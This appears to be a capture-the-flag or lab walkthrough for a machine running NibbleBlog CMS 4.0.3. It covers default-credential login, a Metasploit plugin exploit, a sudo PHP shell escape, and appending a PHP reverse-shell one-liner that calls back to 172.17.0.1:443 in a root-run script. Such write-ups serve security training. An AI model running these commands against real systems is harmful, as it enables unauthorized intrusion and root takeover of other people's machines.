# Ports open
80
# Initial Access Method

1) Find the web app, NibbleBlog CMS, and determine that it was using default credentials, admin:admin
2) Determined the software version: 4.0.3, available on the settings page after loggin in as admin
3) Research that version of NibbleBlog, and discover that it has known hacks
4) Research the CVE for NibbleBlog, and discover that it requires the MyImage plugin to be installed
5) Install the plugin from the admin console in the Plugins section
6) Run the module available on the Metasploit console

# Privilege Esclation
1) Figure out that our user (www-data) has sudo access as the chocolate user with the PHP command
2) Use a PHP privilege escalation command to get access as the chocolate user
```
sudo -u chocolate php -r "system('/bin/bash');"
```
3) As chocolate, discover that there is a script file in the /opt directory, which we can own
4) Use the Pspy program to discover that the script in the /opt directory is being run as root
5) Add an additional to the script.php file which gives a reverse shell connection when run
```
echo '<?php $sock=fsockopen("172.17.0.1",443);system("bash <&3 >&3 2>&3"); ?>' >> script.php
```
Finis
